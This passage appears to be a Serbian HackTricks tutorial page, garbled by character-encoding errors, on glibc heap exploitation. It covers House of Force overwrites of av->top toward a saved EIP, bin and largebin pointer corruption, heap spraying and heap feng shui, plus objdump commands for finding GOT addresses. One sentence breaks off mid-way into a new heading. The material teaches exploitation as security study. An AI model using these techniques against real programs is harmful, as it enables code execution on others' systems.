Prvo Å¡to se radi je prebrisavanje veliÄine segmenta wilderness sa vrlo velikom vrednoÅ¡Ä‡u (0xffffffff), tako da Ä‡e svaki zahtev za memorijom koji je dovoljno velik biti obraÄ‘en u \_int\_malloc() bez potrebe za proÅ¡irivanjem heap-a.

Drugo je izmena av->top tako da pokazuje na deo memorije pod kontrolom napadaÄa, kao Å¡to je stek. U av->top se postavlja \&EIP - 8.

Mora se prebrisati av->top tako da pokazuje na deo memorije pod kontrolom napadaÄa:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim uzima vrednost adrese trenutnog segmenta wilderness (trenutni av->top) i remainder je taÄno zbir te adrese plus broj bajtova koji su traÅ¾eni od strane malloc(). Dakle, ako je \&EIP-8 na adresi 0xbffff224 i av->top sadrÅ¾i 0x080c2788, tada je koliÄina koju moramo rezervisati u kontrolisanom mallocu kako bi av->top pokazivao na $EIP-8 za sledeÄ‡i malloc():

0xbffff224 - 0x080c2788 = 3086207644.

Na taj naÄin se Äuva promenjena vrednost u av->top i sledeÄ‡i malloc Ä‡e pokazivati na EIP i moÄ‡i
## Heap eksploatacija - osnovni ESP

### Overflow sa dva malloc-a

Potrebno je rezervisati dva malloc-a, tako da prvi moÅ¾e biti preplavljen nakon Å¡to je drugi osloboÄ‘en i ubaÄen u svoj bin (tj. kada je rezervisan malloc veÄ‡i od drugog dela pre nego Å¡to se preplavi).

Malloc koji je rezervisan i Äija adresa je odabrana od strane napadaÄa mora biti pod kontrolom napadaÄa.

Cilj je sledeÄ‡i: ako moÅ¾emo preplaviti heap koji ima osloboÄ‘en deo ispod sebe i nalazi se u svom bin-u, moÅ¾emo promeniti njegov bk pokazivaÄ. Ako promenimo bk pokazivaÄ i taj deo postane prvi na listi bin-a i rezerviÅ¡e se, bin Ä‡e biti prevaren i reÄ‡i Ä‡e mu se da je poslednji deo liste (sledeÄ‡i koji se nudi) na laÅ¾noj adresi koju smo postavili (na stack ili GOT na primer). Dakle, ako se rezerviÅ¡e joÅ¡ jedan deo i napadaÄ ima dozvole na njemu, dobiÄ‡e deo na Å¾eljenoj poziciji i moÄ‡i Ä‡e da piÅ¡e u njega.

Nakon Å¡to je promenjen deo osloboÄ‘enog dela, potrebno je rezervisati deo koji je veÄ‡i od osloboÄ‘enog, tako da promenjeni deo izaÄ‘e iz unsorted bin-a i ubaci se u svoj bin.

Kada se nalazi u svom bin-u, vreme je da se promeni bk pokazivaÄ preko preplavljenosti kako bi pokazivao na adresu koju Å¾elimo da prepiÅ¡emo.

Dakle, bin mora da Äeka da se dovoljno puta pozove malloc() kako bi se ponovo koristio promenjeni bin i prevario bin tako Å¡to Ä‡e mu se reÄ‡i da je sledeÄ‡i deo na laÅ¾noj adresi. A zatim Ä‡e biti dat deo koji nam je potreban.

Da bi se izvrÅ¡ila ranjivost Å¡to je pre moguÄ‡e, idealno bi bilo: rezervacija ranjivog dela, rezervacija dela koji Ä‡e biti promenjen, osloboÄ‘enje tog dela, rezervacija dela koji je veÄ‡i od dela koji Ä‡e biti promenjen, promena dela (ranjivost), rezervacija dela iste veliÄine kao ranjivi deo i rezervacija drugog dela iste veliÄine koji Ä‡e pokazivati na odabranu adresu.

Da bi se zaÅ¡titio od ovog napada, koristi se tipiÄna provera da deo "nije" laÅ¾an: proverava se da li bck->fd pokazuje na Å¾rtvu. Drugim reÄima, u naÅ¡em sluÄaju, ako pokazivaÄ fd* laÅ¾nog dela na stack-u pokazuje na Å¾rtvu. Da bi se prevaziÅ¡la ova zaÅ¡tita, napadaÄ mora biti sposoban da na neki naÄin (verovatno preko stack-a) upiÅ¡e odgovarajuÄ‡u adresu Å¾rtve na odgovarajuÄ‡u adresu. Tako Ä‡e izgledati kao pravi deo.

### Korupcija LargeBin-a

Potrebni su isti uslovi kao i pre, ali i neki dodatni, osim toga, rezervisani delovi moraju biti veÄ‡i od 512.

Napad je isti kao i prethodni, tj. potrebno je promeniti bk pokazivaÄ i potrebni su svi ti pozivi malloc(), ali takoÄ‘e je potrebno promeniti veliÄinu promenjenog dela tako da ta veliÄina - nb bude < MINSIZE.

Na primer, postaviÄ‡emo veliÄinu na 1552 kako bi 1552 - 1544 = 8 < MINSIZE (oduzimanje ne sme biti negativno jer se uporeÄ‘uje sa unsigned vrednoÅ¡Ä‡u).

TakoÄ‘e je uveden zakrpa da bi to bilo joÅ¡ teÅ¾e.

### Heap Spraying

Osnovna ideja je rezervisati Å¡to viÅ¡e memorije za heap-ove i popuniti ih jastukom od nops-a koji se zavrÅ¡ava shellcode-om. Osim toga, kao jastuk se koristi 0x0c. PokuÅ¡aÄ‡emo da skoÄimo na adresu 0x0c0c0c0c, tako da ako se neka adresa preplavi sa ovim jastukom i pozove se, skoÄiÄ‡e tamo. Osnovna taktika je rezervisati Å¡to je viÅ¡e moguÄ‡e da bismo videli da li se neki pokazivaÄ preplavljuje i skoÄiti na 0x0c0c0c0c u nadi da Ä‡e tamo biti nops.

### Heap Feng Shui

Sastoji se od rezervacija i osloboÄ‘enja memorije na naÄin da se delovi memorije rezerviÅ¡u izmeÄ‘u osloboÄ‘enih delova. Buffer koji Ä‡e biti preplavljen Ä‡e biti smeÅ¡ten u jednom od tih delova.

### objdump -d izvrÅ¡ni_fajl â€”> Disas funkcije
### objdump -d ./PROGRAM | grep FUNKCIJA â€”> Dobijanje adrese funkcije
### objdump -d -Mintel ./shellcodeout â€”> Da biste videli da li je to zaista naÅ¡ shellcode i izvukli OpCodes
### objdump -t ./exec | grep varBss â€”> Tabela simbola, da biste dobili adresu promenljive i funkcije
### objdump -TR ./exec | grep exit(func lib) â€”> Da biste dobili adresu funkcija biblioteka (GOT)
### objdump -d ./exec | grep funcCode
### objdump -s -j .dtors /exec
### objdump -s -j .got ./exec
### objdump -t --dynamic-relo ./exec | grep puts â€”> IzvlaÄi adresu puts-a koju treba prebrisati u GOT-u
### objdump -D ./exec â€”> Disas sve do ulaza u plt
### objdump -p -/exec
### Info functions strncmp â€”> Info o funkciji u gdb

## Interesantni kursevi

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)

## **Reference**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini da podrÅ¾ite HackTricks:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju oglaÅ¡enu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
